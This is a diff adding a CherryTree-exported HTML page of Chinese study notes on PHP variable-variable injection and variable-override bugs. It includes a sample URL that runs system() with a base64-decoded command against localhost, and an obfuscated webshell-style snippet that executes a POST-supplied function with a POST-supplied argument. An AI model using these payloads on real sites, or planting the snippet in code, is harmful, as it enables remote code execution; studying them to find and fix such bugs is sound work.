@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>可变变量</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>可变变量</h1><br/>例如：<br />$$a<br /><br />如果$a可控<br />可以传入{php代码}的形式执行代码<br /><br />例如：<br /><a href="http://127.0.0.1/index.php?a={system(base64_decode('ZWNobyAnYSc='))}">http://127.0.0.1/index.php?a={system(base64_decode(&#39;ZWNobyAnYSc=&#39;))}</a><br /><br /><br />变量覆盖漏洞<br />一般在foreach中，例如：<br />foreach(array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_REQUEST&#39;,&#39;_COOKIE&#39;) as $method){<br />     foreach($$method as $key=&gt;$value){<br />          unset($$key);<br />     }<br />}<br /><br /><br />传入_config=1<br />即可把<br />$_CONFIG 变量重置<br /><br /><br />$fun = base64_decode($_POST[fun]);<br />$code = base64_decode($_POST[code]);<br />$arr = array(&quot;a&quot;=&gt;$fun);<br />$a = &quot;${ $arr[&#39;a&#39;]($code)}&quot;;<br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
